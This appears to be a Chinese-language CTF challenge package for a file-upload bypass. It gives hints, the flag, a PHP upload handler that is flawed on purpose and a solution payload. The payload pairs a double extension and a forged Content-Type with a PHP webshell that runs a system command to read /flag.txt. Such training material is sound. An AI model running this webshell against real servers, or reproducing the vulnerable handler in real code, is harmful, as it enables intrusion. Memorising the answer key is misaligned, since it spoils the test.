# 🔐 文件上传漏洞挑战

## challenge.yml
```yaml
name: "文件上传 — 绕过校验上传 WebShell"
category: Web
difficulty: Medium
points: 200
hints:
  - cost: 10
    text: "网站只允许上传图片，检查了文件扩展名"
  - cost: 20
    text: "试试双扩展名: shell.php.jpg"
  - cost: 25
    text: "Content-Type 头部可以伪造"
flag: "CTF{unr3str1ct3d_f1l3_upl04d_d4ng3r}"
```

## 题目描述
```
# 文件上传 — 绕过校验上传 WebShell

**难度**: ⭐⭐ Medium | **分数**: 200

## 场景
一个头像上传功能，声称"只允许上传图片"。
但真的是这样吗？

## 目标
绕过文件类型校验，上传一个 WebShell 并读取 flag。

## 服务器信息
- 目标: http://upload.challenges.local:8080
- 上传后的文件在 /uploads/ 目录
```

## 漏洞代码 (PHP)
```php
<?php
// upload.php — 存在缺陷的文件上传处理

$target_dir = "/var/www/html/uploads/";
$flag_file = "/flag.txt";  // CTF{unr3str1ct3d_f1l3_upl04d_d4ng3r}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
    $file = $_FILES['avatar'];
    $filename = basename($file['name']);
    $target = $target_dir . $filename;
    
    // ❌ 仅检查扩展名，可被双扩展名绕过
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $allowed = ['jpg', 'jpeg', 'png', 'gif'];
    
    if (!in_array($ext, $allowed)) {
        die("只允许上传图片文件!");
    }
    
    // ❌ 仅检查 Content-Type，可被伪造
    $mime = $file['type'];
    $allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
    
    if (!in_array($mime, $allowed_mime)) {
        die("无效的文件类型!");
    }
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        echo "上传成功: /uploads/$filename";
    } else {
        echo "上传失败!";
    }
}
?>
```

## 绕过 Payload
```
文件名: shell.php.png
Content-Type: image/png（伪造）
内容:   <?php system('cat /flag.txt'); ?>
```
